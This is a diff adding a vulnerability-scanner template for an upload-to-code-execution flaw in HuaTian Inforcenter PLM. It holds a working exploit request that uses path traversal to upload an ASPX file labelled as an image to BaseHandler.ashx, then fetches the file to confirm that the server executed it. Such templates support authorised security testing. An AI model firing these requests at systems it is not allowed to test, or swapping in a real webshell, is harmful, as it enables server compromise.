@@ -1,0 +1,57 @@
+id: HuaTianInforcenterPLM-uploadFileHttp-uploadToRce
+
+info:
+  name: HuaTianInforcenterPLM-uploadFileHttp-uploadToRce
+  author: iSee857
+  severity: high
+  description: |
+    HuaTianInforcenterPLM-uploadFileHttp-uploadToRce.
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNxj6ATqxnclLfnCL
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundaryNxj6ATqxnclLfnCL
+        Content-Disposition: form-data; name="file"; filename="hello.aspx"
+        Content-Type: image/jpeg
+
+        <%= "HelloWorld" %>
+        ------WebKitFormBoundaryNxj6ATqxnclLfnCL--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.aspx"
+    extractors:
+      - type: regex
+        name: file_path
+        group: 0
+        regex:
+          - "/Files/[a-z0-9\\-]+\\.aspx"
+        internal: true
+
+  - raw:
+      - |
+        GET {{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "HelloWorld"
